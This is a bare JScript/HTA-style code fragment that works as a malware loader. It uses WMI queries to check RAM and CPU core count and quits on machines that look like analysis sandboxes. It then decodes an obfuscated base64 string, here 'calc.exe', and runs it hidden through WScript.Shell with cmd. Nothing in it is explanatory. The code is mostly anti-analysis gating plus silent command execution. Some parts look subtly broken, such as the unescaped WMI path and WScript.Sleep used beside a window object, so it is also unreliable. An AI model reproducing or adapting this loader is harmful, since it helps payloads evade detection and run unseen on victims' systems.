
            var _0x1a2b = ["Y2FsYy5leGU=", "atob", "eval"];
            
                var wmi = GetObject("winmgmts:\\.\root\CIMV2");
                var colItems = wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem", "WQL", 0x10 | 0x20);
                var enumItems = new Enumerator(colItems);
                var totalRam = 0;
                for (; !enumItems.atEnd(); enumItems.moveNext()) {
                    var objItem = enumItems.item();
                    totalRam = objItem.TotalPhysicalMemory;
                }
                if (totalRam < 8589934592) { window.close(); }
            

                var wmi = GetObject("winmgmts:\\.\root\CIMV2");
                var colItems = wmi.ExecQuery("SELECT NumberOfLogicalProcessors FROM Win32_ComputerSystem", "WQL", 0x10 | 0x20);
                var enumItems = new Enumerator(colItems);
                var cores = 0;
                for (; !enumItems.atEnd(); enumItems.moveNext()) {
                    var objItem = enumItems.item();
                    cores = objItem.NumberOfLogicalProcessors;
                }
                if (cores < 4) { window.close(); }
            

                WScript.Sleep(1000);
            
            // Execute the payload if all checks pass
            var payload = window[_0x1a2b[1]](_0x1a2b[0]);
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd /c " + payload, 0, true);
        